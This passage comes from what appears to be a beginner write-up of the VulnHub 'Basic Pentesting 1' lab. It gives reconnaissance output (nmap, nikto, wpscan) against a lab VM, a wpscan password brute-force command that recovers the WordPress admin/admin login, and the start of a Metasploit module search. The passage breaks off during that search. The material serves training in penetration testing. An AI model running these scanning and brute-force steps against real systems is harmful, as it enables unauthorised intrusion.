| 
| City:           Los Angeles
| 
| StateProv:      CA
| 
| PostalCode:     90292
| 
| Country:        US
| 
| RegDate:        
| 
| Updated:        2012-08-31
| 
| Ref:            https://rdap.arin.net/registry/entity/IANA
| 
| 
| 
| 
| 
| OrgAbuseHandle: IANA-IP-ARIN
| 
| OrgAbuseName:   ICANN
| 
| OrgAbusePhone:  +1-310-301-5820 
| 
| OrgAbuseEmail:  abuse@iana.org
| 
| OrgAbuseRef:    https://rdap.arin.net/registry/entity/IANA-IP-ARIN
| 
| 
| 
| OrgTechHandle: IANA-IP-ARIN
| 
| OrgTechName:   ICANN
| 
| OrgTechPhone:  +1-310-301-5820 
| 
| OrgTechEmail:  abuse@iana.org
| 
| OrgTechRef:    https://rdap.arin.net/registry/entity/IANA-IP-ARIN
| 
| 
| 
| 
| 
| #
| 
| # ARIN WHOIS data and services are subject to the Terms of Use
| 
| # available at: https://www.arin.net/resources/registry/whois/tou/
| 
| #
| 
| # If you see inaccuracies in the results, please report at
| 
| # https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
| 
| #
| 
| # Copyright 1997-2021, American Registry for Internet Numbers, Ltd.
| 
| #
| 
| 
| 
===================================================================================================
| BANNER GRABBING: 
| X-Meta-Generator: WordPress 4.9
| Looking for Wordpress plugins: 
===================================================================================================
===================================================================================================
| PING
| 
| PING 192.168.125.135 (192.168.125.135) 56(84) bytes of data.
| 64 bytes from 192.168.125.135: icmp_seq=1 ttl=64 time=0.374 ms
| 64 bytes from 192.168.125.135: icmp_seq=2 ttl=64 time=0.495 ms
| 64 bytes from 192.168.125.135: icmp_seq=3 ttl=64 time=0.488 ms
| 64 bytes from 192.168.125.135: icmp_seq=4 ttl=64 time=0.486 ms
| 
| --- 192.168.125.135 ping statistics ---
| 4 packets transmitted, 4 received, 0% packet loss, time 3067ms
| rtt min/avg/max/mdev = 0.374/0.460/0.495/0.050 ms
===================================================================================================
| TRACEROUTE
| 
| traceroute to 192.168.125.135 (192.168.125.135), 30 hops max, 60 byte packets
|  1  192.168.125.135 (192.168.125.135)  9.938 ms  10.381 ms  10.717 ms
===================================================================================================
| NSLOOKUP
| 
| Server:		192.168.191.2
| Address:	192.168.191.2#53
| 
| ** server can't find 135.125.168.192.in-addr.arpa: NXDOMAIN
===================================================================================================
| NMAP
| 
| Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 13:52 AEST
| NSE: Loaded 153 scripts for scanning.
| NSE: Script Pre-scanning.
| Initiating NSE at 13:52
| Completed NSE at 13:52, 0.00s elapsed
| Initiating NSE at 13:52
| Completed NSE at 13:52, 0.00s elapsed
| Initiating NSE at 13:52
| Completed NSE at 13:52, 0.00s elapsed
| Initiating ARP Ping Scan at 13:52
| Scanning 192.168.125.135 [1 port]
| Completed ARP Ping Scan at 13:52, 0.04s elapsed (1 total hosts)
| Initiating Parallel DNS resolution of 1 host. at 13:52
| Completed Parallel DNS resolution of 1 host. at 13:52, 6.52s elapsed
| Initiating SYN Stealth Scan at 13:52
| Scanning 192.168.125.135 [1000 ports]
| Discovered open port 80/tcp on 192.168.125.135
| Discovered open port 22/tcp on 192.168.125.135
| Discovered open port 21/tcp on 192.168.125.135
| Completed SYN Stealth Scan at 13:52, 2.32s elapsed (1000 total ports)
| Initiating Service scan at 13:52
| Scanning 3 services on 192.168.125.135
| Completed Service scan at 13:52, 10.02s elapsed (3 services on 1 host)
| Initiating OS detection (try #1) against 192.168.125.135
| NSE: Script scanning 192.168.125.135.
| Initiating NSE at 13:52
| Completed NSE at 13:52, 10.04s elapsed
| Initiating NSE at 13:52
| Completed NSE at 13:53, 28.04s elapsed
| Initiating NSE at 13:53
| Completed NSE at 13:53, 0.00s elapsed
| Nmap scan report for 192.168.125.135
| Host is up (0.033s latency).
| Not shown: 997 closed ports
| PORT   STATE SERVICE VERSION
| 21/tcp open  ftp     ProFTPD 1.3.3c
| 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| | ssh-hostkey: 
| |   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
| |   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
| |_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
| 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| | http-methods: 
| |_  Supported Methods: GET HEAD POST OPTIONS
| |_http-server-header: Apache/2.4.18 (Ubuntu)
| |_http-title: Site doesn't have a title (text/html).
| MAC Address: 00:0C:29:FB:93:05 (VMware)
| Device type: general purpose
| Running: Linux 3.X|4.X
| OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
| OS details: Linux 3.2 - 4.9
| Uptime guess: 161.330 days (since Sun Jan 31 06:58:16 2021)
| Network Distance: 1 hop
| TCP Sequence Prediction: Difficulty=261 (Good luck!)
| IP ID Sequence Generation: All zeros
| Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
| 
| TRACEROUTE
| HOP RTT      ADDRESS
| 1   32.77 ms 192.168.125.135
| 
| NSE: Script Post-scanning.
| Initiating NSE at 13:53
| Completed NSE at 13:53, 0.00s elapsed
| Initiating NSE at 13:53
| Completed NSE at 13:53, 0.00s elapsed
| Initiating NSE at 13:53
| Completed NSE at 13:53, 0.00s elapsed
| Read data files from: /usr/bin/../share/nmap
| OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
| Nmap done: 1 IP address (1 host up) scanned in 59.45 seconds
|            Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.290KB)
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://192.168.125.135/secret/wp-admin/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://192.168.125.135/secret/license.txt
| [+] CODE: 200 URL: http://192.168.125.135/secret/index.php
| [+] CODE: 200 URL: http://192.168.125.135/secret/readme.html
| [+] CODE: 200 URL: http://192.168.125.135/secret/wp-content/plugins/akismet/readme.txt
===================================================================================================
|
| Check robots.txt:
|
| Check sitemap.xml:
===================================================================================================
|
| Crawler Started:
| Plugin name: FCKeditor upload test v.1 Loaded.
| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
| Plugin name: Upload Form Detect v.1.1 Loaded.
| Plugin name: Code Disclosure v.1.1 Loaded.
| Plugin name: E-mail Detection v.1.1 Loaded.
| Plugin name: External Host Detect v.1.2 Loaded.
| Plugin name: phpinfo() Disclosure v.1 Loaded.
| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
| [+] Crawling finished, 38 URL's found!
|
| FCKeditor File Upload:
|
| Timthumb:
|
| File Upload Forms:
|
| Source Code Disclosure:
|
| E-mails:
| [+] E-mail Found: m@tidakada.com
|
| External hosts:
| [+] External Host Found: https://planet.wordpress.org
| [+] External Host Found: https://www.mysql.com
| [+] External Host Found: https://httpd.apache.org
| [+] External Host Found: https://wordpress.org
| [+] External Host Found: http://gmpg.org
| [+] External Host Found: https://developer.wordpress.org
| [+] External Host Found: http://vtcsec
| [+] External Host Found: https://secure.php.net
| [+] External Host Found: https://codex.wordpress.org
|
| PHPinfo() Disclosure:
|
| Web Backdoors:
|
| Ignored Files: 
| http://192.168.125.135/secret/wp-admin/css/install.css?ver=20100228
===================================================================================================
| Dynamic tests:
| Plugin name: Learning New Directories v.1.2 Loaded.
| Plugin name: FCKedior tests v.1.1 Loaded.
| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
| Plugin name: Find Backup Files v.1.2 Loaded.
| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.2 Loaded.
| Plugin name: SQL-injection tests v.1.2 Loaded.
| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
| Plugin name: Web Shell Finder v.1.3 Loaded.
| [+] 5 New directories added
|                                                                                                   
|                                                                                                   
| FCKeditor tests:
|                                                                                                   
|                                                                                                   
| Timthumb < 1.33 vulnerability:
|                                                                                                   
|                                                                                                   
| Backup Files:
|                                                                                                   
|                                                                                                   
| Blind SQL Injection:
|                                                                                                   
|                                                                                                   
| Local File Include:
|                                                                                                   
|                                                                                                   
| PHP CGI Argument Injection:
|                                                                                                   
|                                                                                                   
| Remote Command Execution:
|                                                                                                   
|                                                                                                   
| Remote File Include:
|                                                                                                   
|                                                                                                   
| SQL Injection:
|                                                                                                   
|                                                                                                   
| Cross-Site Scripting (XSS):
|                                                                                                   
|                                                                                                   
| Web Shell Finder:
===================================================================================================
| Static tests:
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.1 Loaded.
|                                                                                                   
|                                                                                                   
| Local File Include:
|                                                                                                   
|                                                                                                   
| Remote Command Execution:
|                                                                                                   
|                                                                                                   
| Remote File Include:
===================================================================================================
Scan end date: 11-7-2021 13:53:58



HTML report saved in: report/192.168.125.135.html
```

<p></p>
So the extra information we have gathered is:
<p></p>

```
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://192.168.125.135/secret/wp-admin/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://192.168.125.135/secret/license.txt
| [+] CODE: 200 URL: http://192.168.125.135/secret/index.php
| [+] CODE: 200 URL: http://192.168.125.135/secret/readme.html
| [+] CODE: 200 URL: http://192.168.125.135/secret/wp-content/plugins/akismet/readme.txt
===================================================================================================
|
| E-mails:
| [+] E-mail Found: m@tidakada.com
|
| External hosts:
| [+] External Host Found: https://planet.wordpress.org
| [+] External Host Found: https://www.mysql.com
| [+] External Host Found: https://httpd.apache.org
| [+] External Host Found: https://wordpress.org
| [+] External Host Found: http://gmpg.org
| [+] External Host Found: https://developer.wordpress.org
| [+] External Host Found: http://vtcsec
| [+] External Host Found: https://secure.php.net
| [+] External Host Found: https://codex.wordpress.org
```

<p></p>
Lets also run a quick niksto scan against these two sites. Nickto is a web vulnerability scanner you can view the help page by running 'nikto -H', The command will look like this:
<p></p>

```
nikto -h http://192.168.125.135 && nikto -h http://192.168.125.135/secret/
```

<p></p>
Notice the && between the two commands, this basically says run the first command then immediately run the second. THis outputs:
<p></p>

```
❯ nikto -h http://192.168.125.135 && nikto -h http://192.168.125.135/secret/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.125.135
+ Target Hostname:    192.168.125.135
+ Target Port:        80
+ Start Time:         2021-07-11 14:08:36 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: b1, size: 55e1c7758dcdb, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Uncommon header 'link' found, with contents: <http://vtcsec/secret/index.php/wp-json/>; rel="https://api.w.org/"
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-07-11 14:09:38 (GMT10) (62 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.125.135
+ Target Hostname:    192.168.125.135
+ Target Port:        80
+ Start Time:         2021-07-11 14:09:38 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://vtcsec/secret/index.php/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ /secret/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /secret/wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /secret/license.txt: License file found may identify site software.
+ /secret/: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /secret/wp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2021-07-11 14:10:42 (GMT10) (64 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<p></p>
This didn't return anything new for us that we haven't already found so lets begin looking at the web page. Navigating to the webpage presents us with this:
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/7499d3c6d163155de5b164595db2b60e6d6bae70/Starting_Point/VulnHub/BasicPentesting1/images/itworks.png"><br>
</div>
<p></p>
Not very exciting and from our enumeration we know there isn't much else going on with this page, even if we look at the page source it's likely a dead end.
<p></p>

```
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>
```

<p></p>
We should move to the '/secret/' directory and have a look around.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/61e96aed2b5910af22c61fcca7e17d78fa7a1fc8/Starting_Point/VulnHub/BasicPentesting1/images/secret.png"><br>
</div>
<p></p>
This looks a bit more interesting. And now that we are working with wordpress you should look over <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress" rel="nofollow">HackTricks</a> page on wordpress.
<p></p>
Lets have a look around the blog, we can see that there is a post called 'Hello world!' If we navigate to that we find a user, 'admin'.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/923d1b123903f075e0892872580e2dc32bd87927/Starting_Point/VulnHub/BasicPentesting1/images/blogadmin.png"><br>
</div>
<p></p>
We can also see that when we clicked on the post the address changed from an ip address to 'vtcsec' we identified this in our earlier enumeration, we can tidy up our navigation around the site by adding this to our hosts file. If we dont do this some strange things can happen. To do this we enter the following command:
<p></p>

```
nano /etc/hosts
```

<p></p>
Then you will add the ip of the VM followed by a 'tab' followed by 'vtcsec'. Bellow is a screen grab for reference.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/a0283ba0fc38e3eb65342802bf329635ae65d09b/Starting_Point/VulnHub/BasicPentesting1/images/hosts.png"><br>
</div>
<p></p>
If we continue to navigate around the page at the bottom right you can see 'log in' if we navigate there we end up at a word press login page.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/c33e1d908deadee4349dc570e0deda16fe75fbc2/Starting_Point/VulnHub/BasicPentesting1/images/login.png"><br>
</div>
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/d536ccb994168aeb6f73d8aba2c5b4d1249477e4/Starting_Point/VulnHub/BasicPentesting1/images/wplogin.png"><br>
</div>
<p></p>
And that is everything of interest looking at the site, now we can begin enumerating it to see if we can pull any more information. To begin we will use wpscan to run a general scan (you can view wpscans help file using wpscan -h). The command we will use is:

<p></p>

```
wpscan --url 192.168.125.135/secret/ -e p
```

<p></p>
This command is pretty simple, <kbd>--url</kbd> points to the ip address and <kbd>-e p</kbd> tells wpscan to use all the popular plugins.
Which outputs:
<p></p>

```
❯ wpscan --url 192.168.125.135/secret/ -e p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.125.135/secret/ [192.168.125.135]
[+] Started: Sun Jul 11 17:11:09 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.125.135/secret/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.125.135/secret/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.125.135/secret/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9 identified (Insecure, released on 2017-11-16).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.125.135/secret/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.125.135/secret/, Match: 'WordPress 4.9'

[i] The main theme could not be detected.

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jul 11 17:11:10 2021
[+] Requests Done: 25
[+] Cached Requests: 4
[+] Data Sent: 7.079 KB
[+] Data Received: 120.037 KB
[+] Memory used: 172.602 MB
[+] Elapsed time: 00:00:01
```

<p></p>
The most important information we found was:
<p></p>

```
[+] WordPress version 4.9 identified (Insecure, released on 2017-11-16).
```

<p></p>
So we know this version of wordpress is insecure. Lets see if we can find anymore users using wpscan. The command we will use is:
<p></p>

```
wpscan --url 192.168.125.135/secret/ -e u1-10
```

<p></p>
The difference in this command comes at the <kbd>-e</kbd> flag which points to <kbd>u1-10</kbd> which will look for users with an id between 1 and 10. This command outputs:
<p></p>

```
❯ wpscan --url 192.168.125.135/secret/ -e u1-10
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.125.135/secret/ [192.168.125.135]
[+] Started: Sun Jul 11 17:17:41 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.125.135/secret/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.125.135/secret/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.125.135/secret/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9 identified (Insecure, released on 2017-11-16).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.125.135/secret/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.125.135/secret/, Match: 'WordPress 4.9'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jul 11 17:17:42 2021
[+] Requests Done: 25
[+] Cached Requests: 28
[+] Data Sent: 6.824 KB
[+] Data Received: 174.938 KB
[+] Memory used: 124.84 MB
[+] Elapsed time: 00:00:00
```

<p></p>
We didnt find any other usernames except admin which we found when we were looking around the site to begin with so we will move onto breaking into the site.
<p></p>
Since this write up is designed for very beginners I will take you through how to break into the site using wpscan and a password list which is very easy however it is possible to use hydra to break into this site because of its bad configuration, if you want to know how to do this refer to my <a href="https://github.com/Shadow-Admins/Cyber_Club/tree/main/Starting_Point/VulnHub/MrRobot" rel="nofollow">writeup</a> on Mr Robot where I take you through enumerating and bruteforcing wordpress using hydra (this skill can be used in more situations than wpscan so is a good tool to have in your arsenel).
<p></p>
To bruteforce into the site we will use the following command:
<p></p>

```
wpscan --url 192.168.125.135/secret/wp-login.php -U admin -P /usr/share/wordlists/SecLists/Passwords/cirt-default-passwords.txt --force
```

<p></p>
In this command you can see the change is to the end of the command, the <kbd>-U</kbd> flag points to the username we discovered, the <kbd>-P</kbd> flag points to the password file we wish to use in this case the cirt-default-passwords.txt file from <a href="https://github.com/danielmiessler/SecLists" rel="nofollow">SecLists</a> which is an essential git you need to pull it is full of all types of lists for enumerating and bruteforcing. finally you can see the <kbd>--force</kbd> flag, I had to use this because I kept getting an error saying that the site wasn't running wordpress, which we know it is. THis command outputs the following:
<p></p>

```
❯ wpscan --url 192.168.125.135/secret/wp-login.php -U admin -P /usr/share/wordlists/SecLists/Passwords/cirt-default-passwords.txt --force
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.125.135/secret/wp-login.php/ [192.168.125.135]
[+] Started: Sun Jul 11 18:05:46 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://192.168.125.135/secret/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://192.168.125.135/secret/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:00:02 <=============================================================================================================> (632 / 632) 100.00% Time: 00:00:02
[i] The WordPress version could not be detected.

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / admin                                                                                                                                                                     
Trying admin / admin Time: 00:00:03 <======================================                                                                               > (535 / 1576) 33.94%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: admin

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jul 11 18:05:53 2021
[+] Requests Done: 1306
[+] Cached Requests: 823
[+] Data Sent: 676.626 KB
[+] Data Received: 2.088 MB
[+] Memory used: 185.473 MB
[+] Elapsed time: 00:00:07
```

<p></p>
And we got a return:
<p></p>

```
[!] Valid Combinations Found:
 | Username: admin, Password: admin
```

<p></p>
Now we can log into the page and are presented with the dashboard.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/08dbc91b08a4f842635de0c5bfb0d95e5707de45/Starting_Point/VulnHub/BasicPentesting1/images/wpdashboard.png"><br>
</div>
<p></p>
Now what to do, again if you refer to my <a href="https://github.com/Shadow-Admins/Cyber_Club/tree/main/Starting_Point/VulnHub/MrRobot" rel="nofollow">writeup</a> on Mr Robot you can see how to include a php reverse shell in the page however we are going to be even more simple in this situation. We are going to use msfconsole to get us a shell (note I couldn't get this method to work but I know it can be done so I will still include how to do it). First we need to start msf, to do this we run:
<p></p>

```
msfconsole
```

<p></p>
Which outputs:
<p></p>

```
❯ msfconsole
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: You can use help to view all 
available commands

msf6 > 
```

<p></p>
Next we need to search for wordpress using the following command:
<p></p>

```
search wordpress
```

<p></p>
Which outputs: (note I am only showing the first 25 entries because it is a 95 long list)
<p></p>

```
msf6 > search wordpress

Matching Modules
================

   #   Name                                                           Disclosure Date  Rank       Check  Description
   -   ----                                                           ---------------  ----       -----  -----------
   0   auxiliary/scanner/http/wp_abandoned_cart_sqli                  2020-11-05       normal     No     Abandoned Cart for WooCommerce SQLi Scanner
   1   exploit/windows/fileformat/adobe_flashplayer_button            2010-10-28       normal     No     Adobe Flash Player "Button" Remote Code Execution
   2   exploit/windows/browser/adobe_flashplayer_newfunction          2010-06-04       normal     No     Adobe Flash Player "newfunction" Invalid Pointer Use
   3   exploit/windows/fileformat/adobe_flashplayer_newfunction       2010-06-04       normal     No     Adobe Flash Player "newfunction" Invalid Pointer Use
   4   exploit/osx/local/rootpipe_entitlements                        2015-07-01       great      Yes    Apple OS X Entitlements Rootpipe Privilege Escalation
   5   exploit/osx/local/rootpipe                                     2015-04-09       great      Yes    Apple OS X Rootpipe Privilege Escalation
   6   exploit/windows/ftp/easyftp_cwd_fixret                         2010-02-16       great      Yes    EasyFTP Server CWD Command Stack Buffer Overflow
   7   exploit/freebsd/local/rtld_execl_priv_esc                      2009-11-30       excellent  Yes    FreeBSD rtld execl() Privilege Escalation
   8   auxiliary/scanner/kademlia/server_info                                          normal     No     Gather Kademlia Server Information
   9   exploit/unix/webapp/joomla_akeeba_unserialize                  2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
   10  exploit/windows/fileformat/ms12_005                            2012-01-10       excellent  No     MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability
   11  exploit/unix/webapp/php_xmlrpc_eval                            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
